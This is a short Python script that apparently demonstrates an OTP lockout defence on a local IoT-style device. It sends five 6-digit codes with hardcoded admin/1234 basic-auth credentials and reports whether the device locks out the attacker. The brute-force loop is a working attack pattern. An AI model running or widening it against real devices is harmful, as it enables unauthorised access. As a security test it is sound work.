import requests
from requests.auth import HTTPBasicAuth
import time

# Configuration
TARGET_IP = "http://10.39.28.3"
ADMIN_USER = "admin"
ADMIN_PASS = "1234"

def start_secure_attack():
    print(f"[*] Testing security on {TARGET_IP}...")
    print("[!] Security Active: 6-digit OTP + 3-Attempt Lockout.")
    
    # We try only 5 codes to demonstrate the lockout
    for code in range(100000, 100005):
        # Format as 6-digit string (e.g., 100000)
        formatted_code = str(code).zfill(6)
        print(f"[#] Attempting Code: {formatted_code}...")
        
        params = {'t': '99', 'h': '99', 'code': formatted_code}
        
        try:
            response = requests.get(
                TARGET_IP, 
                params=params, 
                auth=HTTPBasicAuth(ADMIN_USER, ADMIN_PASS),
                timeout=5
            )
            
            if response.status_code == 403:
                if "locked" in response.text.lower():
                    print("\n[X] ATTACK HALTED: The device has PERMANENTLY LOCKED the attacker.")
                    print("[X] Reason: 3 failed attempts detected.")
                    return
                else:
                    print(f"[-] Code {formatted_code} rejected.")
            
            elif response.status_code == 200:
                print(f"[+] Success! Correct Code: {formatted_code}")
                return

        except requests.exceptions.RequestException as e:
            print(f"[!] Connection Error: {e}")
            break

    print("\n[!] Brute force failed. Security measures were effective.")

if __name__ == "__main__":
    start_secure_attack()